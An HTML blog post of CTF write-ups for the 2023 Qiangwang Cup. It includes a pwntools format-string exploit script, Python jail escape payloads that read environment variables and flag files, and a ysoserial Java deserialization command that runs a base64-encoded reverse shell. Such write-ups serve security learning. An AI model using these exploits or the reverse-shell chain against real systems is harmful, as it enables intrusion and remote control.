<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>2023年第七届强网杯部分WP - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="2023年第七届强网杯部分WP" />
<meta property="og:description" content="一.SpeedUp 在这个网站直接记载了2的27次方的阶乘的每一位数字之和
A244060 - OEIS
对4495662081取个sha256即可 flag{bbdee5c548fddfc76617c562952a3a3b03d423985c095521a8661d248fad3797}
二.谍影重重2.0 将数据包导出为json格式
使用脚本提取字段并进行MD5
import json import pyModeS as pms import hashlib with open(&#39;123.json&#39;, &#39;r&#39;, encoding=&#39;utf-8&#39;) as file: data = json.load(file) info = [] for packet in data: if &#39;layers&#39; in packet[&#39;_source&#39;] and &#39;tcp&#39; in packet[&#39;_source&#39;][&#39;layers&#39;]: tcp_layer = packet[&#39;_source&#39;][&#39;layers&#39;][&#39;tcp&#39;] if &#39;tcp.payload&#39; in tcp_layer: tcp_payload = tcp_layer[&#39;tcp.payload&#39;].replace(&#39;:&#39;,&#39;&#39;) info.append(tcp_payload) planes_data = [] for i in info: msg = i[18:] if pms.adsb.typecode(msg) &gt;= 19 and pms.adsb.typecode(msg) &lt;= 22: icao = pms." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/273faa4173d68a0bf8f8a05ab762d4ea/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-12-18T17:00:00+08:00" />
<meta property="article:modified_time" content="2023-12-18T17:00:00+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">2023年第七届强网杯部分WP</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h2>一.SpeedUp</h2> 
<p>在这个网站直接记载了2的27次方的阶乘的每一位数字之和</p> 
<p><a href="https://oeis.org/A244060/list" rel="nofollow" title="A244060 - OEIS">A244060 - OEIS</a></p> 
<p><img alt="" height="1200" src="https://images2.imgbox.com/c9/5d/sQCPExIw_o.png" width="1200"></p> 
<p>对4495662081取个sha256即可 </p> 
<blockquote> 
 <p style="margin-left:0;text-align:justify;">flag{bbdee5c548fddfc76617c562952a3a3b03d423985c095521a8661d248fad3797}</p> 
</blockquote> 
<h2>二.谍影重重2.0</h2> 
<p>将数据包导出为json格式</p> 
<p><img alt="" height="1200" src="https://images2.imgbox.com/b2/50/LfxiFoJ6_o.png" width="1200"><br> 使用脚本提取字段并进行MD5</p> 
<pre><code class="language-python">import json
import pyModeS as pms
import hashlib

with open('123.json', 'r', encoding='utf-8') as file:
    data = json.load(file)

info = []
for packet in data:
    if 'layers' in packet['_source'] and 'tcp' in packet['_source']['layers']:
        tcp_layer = packet['_source']['layers']['tcp']

        if 'tcp.payload' in tcp_layer:
            tcp_payload = tcp_layer['tcp.payload'].replace(':','')
            info.append(tcp_payload)

planes_data = []

for i in info:
    msg = i[18:]
    if pms.adsb.typecode(msg) &gt;= 19 and pms.adsb.typecode(msg) &lt;= 22:
        icao = pms.adsb.icao(msg)
        velocity_info = pms.adsb.velocity(msg)
        speed, track, vertical_rate, _ = velocity_info

        plane_info = {"icao": icao, "speed": speed, "track": track, "vertical_rate": vertical_rate}
        planes_data.append(plane_info)

fastest_plane = max(planes_data, key=lambda x: x['speed'])
print(hashlib.md5(fastest_plane['icao'].upper().encode()).hexdigest())
</code></pre> 
<p>请无视报错，pycharm被我搞得有点坏 </p> 
<p><img alt="" height="1200" src="https://images2.imgbox.com/2e/10/AwFQMBUr_o.png" width="1200"></p> 
<h2>三.Pyjail ! It's myFILTER !!!</h2> 
<p>使用nc连接，发现有很多代码</p> 
<p><img alt="" height="1200" src="https://images2.imgbox.com/eb/45/NIeOTWbH_o.png" width="1200">审计发现漏洞-非预期读环境变量 </p> 
<p>使用payload</p> 
<blockquote> 
 <p>{print(open("/proc/1/environ").read())}</p> 
</blockquote> 
<p><img alt="" height="383" src="https://images2.imgbox.com/74/10/0TngpdjP_o.png" width="1200"></p> 
<h2>四.Ez_fmt</h2> 
<p>脚本如下</p> 
<pre><code class="language-python">from pwn import *
context(os='linux', arch='amd64', log_level='debug')
#p = process('./ez_fmt')
p = remote('ip', port)
elf = ELF('./ez_fmt')
libc = ELF('./libc-2.31.so')

p.recvuntil("0x")
stack=int(p.recv(12),16)
print(hex(stack))
pay=b'%4589c%11$hn%19$p'.ljust(0x28,b'\x00')+p64(stack-8)
p.send(pay)

p.recvuntil("0x")
libc_base=int(p.recv(12),16)-libc.sym['__libc_start_main']-243
print(hex(libc_base))

one_gadget=libc_base+0xe3b01
p.recvuntil("\n")
pay=(b'%'+str(one_gadget&amp;0xffff).encode()+b'c%10$hn'+b'%'+str(((one_gadget&gt;&gt;16)&amp;0xffff)-(one_gadget&amp;0xffff)).encode()+b'c%11$hn').ljust(0x20,b'\x00')+p64(stack+0x68)+p64(stack+0x68+2)
p.send(pay)

p.interactive()
</code></pre> 
<p><img alt="" height="1200" src="https://images2.imgbox.com/c6/a7/nON2Rs3I_o.png" width="1200"></p> 
<h2>五.babyre</h2> 
<p>发现有tls反调试</p> 
<p><img alt="" height="1002" src="https://images2.imgbox.com/60/5f/I4GyX1P3_o.png" width="1200"></p> 
<p><img alt="" height="760" src="https://images2.imgbox.com/76/88/GcGJyEFG_o.png" width="958"></p> 
<p style="margin-left:0;"><a name="u092d947e"><span style="color:#000000;"> tea族算法解密 </span></a></p> 
<pre><code class="language-cs">#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;





void jiemi(uint32_t v[2], uint32_t const key[4]) {
    unsigned int i,j;
    uint32_t v0=v[0], v1=v[1], delta=0x88408067, sum=0xd192c263;
    for(i=0;i&lt;4;i++) {
        for (j=0; j&lt;33; j++) {
            sum -= delta;
            v1 -= (((v0 &lt;&lt; 5) ^ (v0 &gt;&gt; 4)) + v0) ^ (sum + key[(sum&gt;&gt;11) &amp; 3]);
            v0 -= (((v1 &lt;&lt; 5) ^ (v1 &gt;&gt; 4)) + v1) ^ (sum + key[sum &amp; 3]) ^sum;
        }
    }
    v[0]=v0; v[1]=v1;
}

int main()
{
    uint32_t array[8] = {0x9523F2E0, 0x8ED8C293, 0x8668C393, 0xDDF250BC, 0x510E4499, 0x8C60BD44, 0x34DCABF2, 0xC10FD260};
    uint32_t  key[4]={0x62, 0x6F, 0x6D, 0x62};
    for (int i = 0; i &lt; 8; i += 2) {  
        uint32_t temp[2];  
        temp[0] = array[i];  
        temp[1] = array[i + 1];  
        jiemi(temp, key);  

        printf("%c%c%c%c%c%c%c%c",  
           (char)(temp[0] &gt;&gt; 0), (char)(temp[0] &gt;&gt; 8), (char)(temp[0] &gt;&gt; 16), (char)(temp[0] &gt;&gt; 24),  
           (char)(temp[1] &gt;&gt; 0), (char)(temp[1] &gt;&gt; 8), (char)(temp[1] &gt;&gt; 16), (char)(temp[1] &gt;&gt; 24));  
    }
    return 0;
}
</code></pre> 
<p style="margin-left:0;"><img alt="" height="1051" src="https://images2.imgbox.com/72/05/iDFdMj9f_o.png" width="1200"></p> 
<h2>六.Pyjail ! It's myRevenge</h2> 
<p>使用nc连接，依次进行如下操作</p> 
<blockquote> 
 <p>{globals().update(dict(my_filter=lambda x:1))}''{in''put()}'#<br> {globals().update(dict(len=lambda x:0))}''{in''put()}'#<br> {print("".__class__.__mro__[1].__subclasses__()[137].__init__.__globals__["__builtins__"]["__import__"]("os").listdir())}<br> ['flag_26F574F8CEE82D06FEDC45CF5916B86A732DD326CE1CB2C9A96751E072D0A104', 'server_8F6C72124774022B.py']</p> 
 <p>{globals().update(dict(my_filter=lambda x:1))}''{in' 'put()}'# <br> {globals(). update(dict(len=lambda x:0))}''{in' 'put()}'#<br> {print (open("flag_26F574F8CEE82D06FEDC45CF5916B86A732DD326CE1CB2C9A96751E072D0A104"). read())}</p> 
</blockquote> 
<p><img alt="" height="297" src="https://images2.imgbox.com/de/08/xOcJa93f_o.png" width="1200"></p> 
<p><img alt="" height="307" src="https://images2.imgbox.com/4a/c1/JkJu8JhD_o.png" width="1200"></p> 
<h2>七.石头剪刀布</h2> 
<p>按照如下顺序即可获胜</p> 
<blockquote> 
 <p>0000011220120220110111222010022012110021012012202100112022100112110020110220210201</p> 
</blockquote> 
<p><img alt="" height="809" src="https://images2.imgbox.com/29/a3/yoHDNCPW_o.png" width="925"></p> 
<h2>八.happygame</h2> 
<p>使用ysoserial-all.jar工具</p> 
<blockquote> 
 <p>java -jar ysoserial-all.jar CommonsCollections5 'bash -c {echo,xxxxx}|{base64,-d}|{bash,-i}'|base64</p> 
</blockquote> 
<p>其中xxxx为反弹shell的base64编码</p> 
<p>可以使用在线网站生成反弹shell的指令</p> 
<blockquote> 
 <p><a href="https://forum.ywhack.com/shell.php" rel="nofollow" title="[~]#棱角 ::Edge.Forum*">[~]#棱角 ::Edge.Forum*</a></p> 
</blockquote> 
<p><img alt="" height="743" src="https://images2.imgbox.com/db/11/uDkRvyoR_o.png" width="1200"> 打开postman，使用grpc协议，填写ip，端口，选择ProcessMsg接口</p> 
<p><img alt="" height="1106" src="https://images2.imgbox.com/05/c7/bcxqP3ol_o.png" width="1200"></p> 
<p> invoke之后即可反弹shell</p> 
<p><img alt="" height="941" src="https://images2.imgbox.com/71/64/dhp4gDzx_o.png" width="1200"></p> 
<p></p> 
<h2>九.调查问卷</h2> 
<p>不用多说了吧</p> 
<h2><img alt="" height="1068" src="https://images2.imgbox.com/72/71/ASH1Ef0L_o.png" width="1200"> 十.签到</h2> 
<p><img alt="" height="618" src="https://images2.imgbox.com/21/80/d7NfYh1s_o.png" width="1200"></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/851ab6621aafd768b7d2b98ae089f912/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">低代码赋能，解锁汽车行业数字化转型时代下的“新机遇”！</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/059413dc1391fefb341e36d1b65b3c8d/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">去除微信小程序里button的边框</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>